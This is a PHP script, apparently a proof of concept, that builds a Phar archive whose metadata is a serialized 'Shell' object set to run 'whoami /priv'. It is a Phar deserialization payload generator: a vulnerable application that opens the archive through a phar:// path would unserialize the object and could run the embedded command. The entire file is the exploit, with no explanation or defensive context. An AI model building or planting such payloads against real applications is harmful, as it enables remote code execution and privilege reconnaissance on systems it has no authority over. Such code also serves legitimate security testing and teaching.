<?php


# Autoload Shell class
spl_autoload_register(function ($classname){
    include $classname . '.php';
});

try{

    $pharArchive = new Phar('serializedPhar.phar');
    $shellObj = new Shell('whoami /priv');
    $pharArchive->setMetadata($shellObj);
    $pharArchive['pharFile.php'] = file_get_contents('pharFile.php');
    $pharArchive['pharNonBootstrappedFile.php'] = file_get_contents('pharNonBootstrappedFile.php');
    $pharArchive->setStub($pharArchive::createDefaultStub("pharFile.php"));

}
catch(Exception $e){
    $e->getMessage();
}


?>